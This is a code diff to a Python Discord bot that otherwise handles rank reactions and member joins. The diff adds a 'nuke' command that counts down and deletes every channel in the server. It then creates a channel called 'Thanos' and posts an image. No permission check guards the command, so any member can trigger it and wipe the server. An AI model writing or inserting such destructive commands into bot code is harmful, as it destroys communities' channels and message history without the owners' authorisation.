@@ -98,9 +98,24 @@ async def on_ready():
     await bot.add_reaction(msgRank, emojiDia)
 
     
+@bot.command(pass_context=True)
+async def nuke(ctx):
+    x=0
+    await bot.say("3")
+    await asyncio.sleep(1)
+    await bot.say("2")
+    await asyncio.sleep(1)
+    await bot.say("1")
+    await asyncio.sleep(1)
+    await bot.say("0")
+    for i in ctx.message.server.channels:
+        x=x+1
+        await bot.say(("nuking {}").format(str(i)))
+        await bot.delete_channel(str(i))
+    await bot.say(("{} Channels Have Been Nuked").format(x))
+    await bot.create_channel(ctx.message.server,"Thanos", type=discord.ChannelType.text)
+    await bot.send_file(ctx.message.channel,"thanus.png")
     
-    
-
 @bot.event
 async def on_member_join(member):
 
